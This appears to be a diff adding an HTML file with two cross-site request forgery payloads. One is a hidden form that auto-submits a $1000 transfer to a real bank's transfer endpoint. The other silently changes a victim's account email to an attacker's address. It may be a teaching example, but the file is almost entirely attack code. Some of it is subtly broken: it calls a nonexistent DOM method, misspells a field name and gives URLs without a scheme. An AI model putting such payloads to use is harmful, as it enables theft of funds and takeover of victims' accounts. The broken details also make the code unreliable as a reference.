@@ -1,0 +1,14 @@
+<form action="www.wellsfargo.com/transfers" method="post">
+  <input type="hidden" name="transfer[acount]" value="12345678">
+  <input type="hidden" name="transfer[amount]" value="1000">
+  <script>
+    document.getElementByClass("transfer-form").submit();
+  </script>
+</form>
+
+<form action="www.yourdumbapp.com/email/change" method="post">
+  <input type="hidden" name="user[email]" value="hacker12@hotmail.com">
+  <script>
+    document.forms[0].submit();
+  </script>
+</form>
